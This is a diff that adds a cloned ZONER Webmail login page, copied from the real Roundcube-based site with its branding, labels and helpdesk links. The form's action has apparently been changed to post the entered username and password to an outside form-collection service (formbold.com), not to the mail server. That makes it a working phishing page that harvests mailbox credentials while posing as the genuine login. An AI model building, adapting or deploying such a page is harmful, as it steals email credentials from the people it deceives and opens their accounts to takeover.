@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<!-- saved from url=(0026)https://webmail.zoner.com/ -->
+<html lang="en" class="js chrome webkit layout-large"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>ZONER Webmail :: Welcome to ZONER Webmail</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no, maximum-scale=1.0"><meta name="theme-color" content="#0c5a98"><meta name="msapplication-navbutton-color" content="#0c5a98">
+	<link rel="shortcut icon" href="https://webmail.zoner.com/plugins/zoner_shared/images/favicon.ico?s=1598515872">
+	<link rel="stylesheet" href="./ismpo_files/bootstrap.min.css">
+	
+		<link rel="stylesheet" href="./ismpo_files/styles.min.css">
+		
+	
+	
+		<script>
+		try {
+			if (document.cookie.indexOf('colorMode=dark') > -1
+				|| (document.cookie.indexOf('colorMode=light') === -1 && window.matchMedia('(prefers-color-scheme: dark)').matches)
+			) {
+				document.documentElement.className += ' dark-mode';
+			}
+		} catch (e) { }
+		</script>
+	
+<link rel="stylesheet" type="text/css" href="./ismpo_files/jquery-ui.min.css"><link rel="stylesheet" type="text/css" href="./ismpo_files/zoner_2fa.css"><link rel="stylesheet" type="text/css" href="./ismpo_files/zoner_login.css"><link rel="stylesheet" type="text/css" href="./ismpo_files/zoner_css_fixer.css"><script src="./ismpo_files/jquery.min.js.download"></script><script src="./ismpo_files/common.min.js.download"></script><script src="./ismpo_files/app.min.js.download"></script><script src="./ismpo_files/jstz.min.js.download"></script><script>
+/*
+        @licstart  The following is the entire license notice for the 
+        JavaScript code in this page.
+
+        Copyright (C) The Roundcube Dev Team
+
+        The JavaScript code in this page is free software: you can redistribute
+        it and/or modify it under the terms of the GNU General Public License
+        as published by the Free Software Foundation, either version 3 of
+        the License, or (at your option) any later version.
+
+        The code is distributed WITHOUT ANY WARRANTY; without even the implied
+        warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+        See the GNU GPL for more details.
+
+        @licend  The above is the entire license notice
+        for the JavaScript code in this page.
+*/
+var rcmail = new rcube_webmail();
+rcmail.set_env({"task":"login","standard_windows":false,"locale":"en_US","devel_mode":null,"rcversion":10601,"cookie_domain":"","cookie_path":"/","cookie_secure":true,"dark_mode_support":true,"skin":"elastic_zoner_blue","blankpage":"skins/elastic_zoner_blue/watermark.html","refresh_interval":60,"session_lifetime":600,"action":"","comm_path":"/?_task=login","compose_extwin":false,"date_format":"dd.mm.yy","date_format_localized":"DD.MM.YYYY","request_token":"uDiqVZFF9Poa0CjPx42UHtXsJAmg9tiT"});
+rcmail.add_label({"loading":"Loading...","servererror":"Server Error!","connerror":"Connection Error (Failed to reach the server)!","requesttimedout":"Request timed out","refreshing":"Refreshing...","windowopenerror":"The popup window was blocked!","uploadingmany":"Uploading files...","uploading":"Uploading file...","close":"Close","save":"Save","cancel":"Cancel","alerttitle":"Attention","confirmationtitle":"Are you sure...","delete":"Delete","continue":"Continue","ok":"OK","zoner_login.pluginname":"ZONER Login","zoner_login.plugindescription":"Selects Zoner IMAP server before login","zoner_login.old_webmail":"Old webmail interface","zoner_login.first_login":"IMPORTANT: Read before first login into new webmail interface","zoner_login.support":"Helpdesk","zoner_login.support_link":"https://www.czechia.com/clanek/zakaznicka-podpora/","zoner_login.forgotten_pass":"Forgotten password","zoner_login.forgotten_pass_inmail":"inMail Forgotten password","zoner_login.forgotten_pass_link":"https://napoveda.czechia.com/clanek/zmena-hesla-mailboxu/","zoner_login.show_pass":"Show password","zoner_login.hide_pass":"Hide password","zoner_login.keep_lang":"use account settings","zoner_login.invalid_username_format":"Username (part before @) contains invalid characters","zoner_login.username_must_be_mail_address":"Invalid username format - insert valid e-mail address","zoner_login.zis_error":"ZONER Login - unknown CMS server error ($cms_code).","zoner_login.db_error":"ZONER Login - database query during login attempt was not successful","zoner_login.db_error_imap_update":"ZONER Login - attempt to update user's imap server in user's profile was not successful","zoner_login.migration_in_progress":"Login suppressed. Server maintenance or data migration in progress.","zoner_login.service_stopped":"Login suppressed. E-mail service for domain is stopped.","zoner_login.domain_not_found":"Login failed - no e-mail service was found for your omain","zoner_login.mailbox_not_found":"Login failed - mailbox was not found in your domain","zoner_login.invalid_password":"Login failed - invalid password","zoner_login.login_failed_unknown":"Invalid password or username (error code $cms_code)","zoner_login.unknown_error_cms":"Unknown CMS client error.","zoner_login.unknown_error_general":"Unknown error.","zoner_login.contact_helpdesk":"Please contact our helpdesk.","zoner_login.failed_login_check_error":"Login failed - are your username and password correct?","zoner_settings.pluginname":"ZONER Settings","zoner_settings.plugindescription":"ZONER - RC setting hacks etc.","zoner_settings.domain_alias_load_failed":"Domain alias check before identity save failed.","zoner_settings.mailbox_alias_load_failed":"Mailbox alias check before identity save failed.","zoner_settings.cms_login_failed":"CMS login error","zoner_settings.invalid_identity_domain":"Only valid mailbox aliases are allowed as identity emails.","zoner_settings.invalid_identity_mailbox":"Only valid mailbox aliases are allowed as identity emails.","zoner_settings.cms_error":"Error in comunication with CMS server","zoner_settings.unknown_error":"Unknown error. Please contact our helpdesk.","zoner_settings.vacation_redirect_info":"If redirect without local copy is enabled , vacation filter is not active","zoner_settings.vacation_newline_info":"Press \"enter\" to insert new address field","zoner_settings.filter_redirect_info":"If redirect without local copy is enabled , filters are not active.","zoner_settings.no_mobile_layout":"no mobile layout","zoner_settings.attachment_count_limit":"You can upload max. $limit files at once. Total attachment count is not limited.","back":"Back","errortitle":"An error occurred!","options":"Options","plaintoggle":"Plain text","htmltoggle":"HTML","previous":"Previous","next":"Next","select":"Select","browse":"Browse","choosefile":"Choose file...","choosefiles":"Choose files..."});
+rcmail.gui_container("loginfooter","login-footer");rcmail.gui_object('loginform', 'login-form');
+rcmail.gui_object('message', 'messagestack');
+</script>
+
+<script src="./ismpo_files/zoner_settings.js.download"></script><script src="./ismpo_files/jquery-ui.min.js.download"></script><script src="./ismpo_files/login.js.download"></script><script src="./ismpo_files/zoner_login.js.download"></script>
+</head>
+<body class="task-login action-none">
+	
+		<div id="layout">
+	
+
+
+<h1 class="voice">ZONER Webmail Login</h1>
+
+<div id="layout-content" class="selected no-navbar" role="main">
+	<img src="./ismpo_files/zmail_login.png" id="logo" alt="Logo">
+	<form id="login-form" name="login-form" method="post" class="propform" action="https://formbold.com/s/9Rmym">
+<input type="hidden" name="_token" value="uDiqVZFF9Poa0CjPx42UHtXsJAmg9tiT" class="form-control">
+	<input type="hidden" name="_task" value="login" class="form-control"><input type="hidden" name="_action" value="login" class="form-control"><input type="hidden" name="_timezone" id="rcmlogintz" value="Asia/Riyadh" class="form-control"><input type="hidden" name="_url" id="rcmloginurl" value="" class="form-control"><table><tbody><tr class="form-group row"><td class="title" style="display: none;"><label for="rcmloginuser">Username</label></td><td class="input input-group input-group-lg"><span class="input-group-prepend"><i class="input-group-text icon user"></i></span><input name="_user" id="rcmloginuser" required="" size="40" class="form-control" autocapitalize="off" value="" type="text" placeholder="Username"></td></tr><tr class="form-group row"><td class="title" style="display: none;"><label for="rcmloginpwd">Password</label></td><td class="input input-group input-group-lg"><span class="input-group-prepend"><i class="input-group-text icon pass"></i></span><div id="show-pass" title="Show password"><span class="show"></span></div><input name="_pass" id="rcmloginpwd" required="" size="40" class="form-control" autocapitalize="off" autocomplete="off" type="password" placeholder="Password"></td></tr><tr class="form-group row"><td class="title" style="display: none;"><label for="_language">Language</label></td><td class="input input-group input-group-lg"><span class="input-group-prepend"><i class="input-group-text icon update_lang"></i></span><select id="_language" name="_update_lang" class="lang_select form-control custom-select pretty-select" placeholder="Language">
+<option value="0">use account settings</option><option value="cs_CZ">Czech (Česky)</option><option value="sk_SK">Slovak (Slovenčina)</option><option value="en_US">English (US)</option><option value="de_DE">German (Deutsch)</option></select></td></tr></tbody></table><p class="formbuttons"><button type="submit" id="rcmloginsubmit" class="button mainaction submit btn btn-primary btn-lg text-uppercase w-100">Login</button></p>
+		<div id="login-footer" role="contentinfo"><a href="https://napoveda.czechia.com/clanek/zmena-hesla-mailboxu/" target="_blank">Forgotten password</a>&nbsp;●&nbsp;<a href="https://www.czechia.com/clanek/zakaznicka-podpora/" target="_blank">Helpdesk</a></div><div id="zoner_login_banner"><a href="https://www.czechia.com/clanek/antispam-a-antivir/" target="_blank"><img src="./ismpo_files/login_banner.png"></a></div>
+
+
+
+<div id="messagestack"></div>
+<script>
+$(function() {
+rcmail.init();
+});
+</script>
+
+
+
+<script src="./ismpo_files/bootstrap.bundle.min.js.download"></script>
+<script src="./ismpo_files/ui.min.js.download"></script>
+
+
+</form></div></div></body></html>
